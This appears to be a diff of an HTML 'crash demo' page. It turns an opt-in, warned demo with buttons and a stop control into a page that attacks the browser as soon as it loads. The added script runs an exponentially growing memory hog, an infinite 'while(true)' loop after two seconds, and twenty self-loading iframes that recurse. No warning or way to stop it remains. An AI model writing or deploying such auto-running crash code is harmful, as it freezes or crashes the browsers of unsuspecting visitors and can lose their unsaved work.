@@ -2,93 +2,36 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Browser Crash Demo (Danger!)</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    body { font-family: system-ui, sans-serif; max-width: 750px; margin: 3rem auto; line-height: 1.5; }
-    .danger { background:#ffe8e8; border:2px solid #ff5a5a; padding:1rem; border-radius:12px }
-    button { font-size:1rem; padding:.8rem 1.2rem; margin:.3rem; border-radius:10px; border:0; cursor:pointer }
-    .red { background:#ff4d4f; color:#fff }
-    .amber { background:#fbbf24; color:#111 }
-    .gray { background:#e5e7eb }
-    code { background:#f3f4f6; padding:.2rem .4rem; border-radius:6px }
-    small { color:#666 }
-  </style>
+  <title>Ultimate Crash Test</title>
 </head>
 <body>
-  <h1>⚠️ Browser Crash / Freeze Demo</h1>
-  <p class="danger">
-    These actions may <strong>freeze</strong> or <strong>crash</strong> this tab/window. Use only for learning/testing on your own device.
-    Close the tab or kill the process if it becomes unresponsive.
-  </p>
-
-  <h2>Options</h2>
-
-  <div>
-    <button class="amber" id="mem-hog">Gradual Memory Hog</button>
-    <button class="red" id="instant-freeze">Instant CPU Freeze</button>
-    <button class="gray" id="stop">Try to Stop</button>
-  </div>
-
-  <p><small>
-    <strong>Gradual Memory Hog</strong> allocates growing strings/arrays on each animation frame until the tab stalls/crashes.<br>
-    <strong>Instant CPU Freeze</strong> runs a tight <code>while(true)</code> after a 3-second countdown, freezing the main thread immediately.
-  </small></p>
-
-  <pre id="log"></pre>
+  <h1>💥 Ultimate Crash Demo</h1>
+  <p>If you can still read this, the script hasn’t locked yet.</p>
 
   <script>
-    const logEl = document.getElementById('log');
-    const stopBtn = document.getElementById('stop');
-    const memBtn = document.getElementById('mem-hog');
-    const freezeBtn = document.getElementById('instant-freeze');
+    // --- MEMORY HOG ---
+    const junk = [];
+    let s = "x".repeat(1024 * 1024); // 1 MB seed
 
-    let stopFlag = false;
-    function log(msg) {
-      logEl.textContent += msg + "\n";
-    }
+    (function hog() {
+      s = s + s;              // doubles each time
+      junk.push(s.slice());   // keep it in memory
+      requestAnimationFrame(hog);
+    })();
 
-    // 1) Gradual memory pressure until OOM / stall
-    memBtn.onclick = () => {
-      stopFlag = false;
-      log("Starting memory hog...");
-      const junk = [];
-      let s = "x".repeat(1024 * 1024); // 1 MB seed
-      (function pump() {
-        if (stopFlag) { log("Stopped memory hog."); return; }
-        // Duplicate and concatenate to grow rapidly
-        s = s + s;               // doubles size
-        junk.push(s.slice());    // keep references to prevent GC
-        log(`Allocated ~${(s.length / (1024*1024)).toFixed(1)} MB chunk; total objects: ${junk.length}`);
-        // Schedule next frame (lets UI breathe a tiny bit… until it doesn't)
-        requestAnimationFrame(pump);
-      })();
-    };
+    // --- CPU FREEZE ---
+    setTimeout(() => {
+      while (true) {} // locks main thread
+    }, 2000); // starts after 2 sec
 
-    // 2) Instant CPU freeze after countdown
-    freezeBtn.onclick = async () => {
-      stopFlag = false;
-      for (let i = 3; i > 0; i--) {
-        log(`Freezing in ${i}…`);
-        await new Promise(r => setTimeout(r, 700));
+    // --- IFRAME RECURSION ---
+    setTimeout(() => {
+      for (let i = 0; i < 20; i++) {
+        const iframe = document.createElement("iframe");
+        iframe.src = location.href; // reloads this same page inside
+        document.body.appendChild(iframe);
       }
-      log("Freezing NOW (while(true)) …");
-      // Tight loop: this will hang the tab immediately.
-      // eslint-disable-next-line no-constant-condition
-      while (true) {}
-    };
-
-    // Best-effort stop (may not work once the tab is already hung)
-    stopBtn.onclick = () => {
-      stopFlag = true;
-      log("Stop requested. If unresponsive, close this tab or force-quit the browser process.");
-    };
-
-    // Minor safeguard: warn on unload
-    window.addEventListener('beforeunload', (e) => {
-      e.preventDefault();
-      e.returnValue = '';
-    });
+    }, 1000); // spawn frames before CPU lock
   </script>
 </body>
 </html>
